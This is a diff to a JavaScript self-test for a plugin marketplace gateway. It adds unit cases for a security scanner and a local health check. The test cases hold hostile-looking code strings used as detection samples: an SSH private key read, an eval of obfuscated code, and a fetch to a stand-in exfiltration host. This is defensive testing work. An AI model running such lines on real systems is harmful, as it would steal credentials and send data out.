@@ -85,7 +85,7 @@ const fakeCtx = {
   baseUrl: join(home, 'profiles', 'web'),
 }
 
-const { ZatMarketGateway } = await import(pathToFileURL(join(selftestDir, 'lib', 'index.js')).href)
+const { ZatMarketGateway, scanSecurity } = await import(pathToFileURL(join(selftestDir, 'lib', 'index.js')).href)
 const gw = new ZatMarketGateway(fakeCtx)
 if (!toolDef) throw new Error('tools.register 没有被调用 —— find_plugin 工具注册失败')
 
@@ -106,7 +106,22 @@ function findUndefined(node, path) {
   return hits
 }
 
-// ── 5. 正/反例:本仓库 ok,不存在的仓库 error ──────────────────────────────
+// ── 5. 安全扫描单元用例 + 正/反例 ────────────────────────────────────────
+console.log('\n== 安全扫描单元用例 ==')
+const secCases = [
+  ['eval(doEvil())', true, /混淆/],
+  ["readFileSync('~/.ssh/id_rsa')", true, /凭据/],
+  ["fetch('https://evil-paste.xyz/save')", true, /可疑网络去向/],
+  ["fetch('https://api.deepseek.com/v1/chat')", false, null],
+  ["fetch('https://vision-provider.example.com/ocr')", true, /外部服务/],
+]
+for (const [code, expectFinding, pattern] of secCases) {
+  const hits = scanSecurity(String(code), '代码')
+  const matched = expectFinding ? hits.some((f) => !pattern || pattern.test(f.title)) : hits.length === 0
+  console.log(`  ${String(code).slice(0, 60)} -> ${hits.map((f) => `${f.level}:${f.title}`).join(' | ') || '(无发现)'}`)
+  assert(matched, `安全用例: ${String(code).slice(0, 40)}`)
+}
+
 console.log('\n== 反例:不存在的仓库(期望 status=error)==')
 const neg = await gw.analyzeCandidateHealth('mishibeikejie', 'zat-dsh-engine-does-not-exist-xyz', 'plugin')
 console.log(`  status=${neg.status} summary=${neg.summary}`)
@@ -131,6 +146,12 @@ console.log('\n== 放宽搜索探针(topic 为空时自动全文兜底,信息展
 const probe = await toolDef.execute({ query: 'UI设计界面', limit: 3 })
 console.log(`  notice: ${probe.notice}`)
 for (const it of probe.items) console.log(`  - ${it.fullName} ★${it.stars} [${it.kind}] installable=${it.installable} health=${it.health.status}`)
+
+console.log('\n== 一键检测(对本机真实 profile 的已装插件跑安全扫描)==')
+const hc = await gw.healthCheck()
+console.log(`  ok=${hc.ok} issues=${Array.isArray(hc.issues) ? hc.issues.length : 'n/a'}`)
+for (const it of (hc.issues || []).slice(0, 30)) console.log(`  [${it.level}] ${it.title} — ${String(it.detail || '').slice(0, 80)}`)
+assert(hc.ok === true, 'healthCheck 正常返回 ok:true')
 
 // ── 6. 真实搜索 + 体检 + 输出形状 ─────────────────────────────────────────
 const query = process.argv[2] || '视觉 图片识别 OCR'
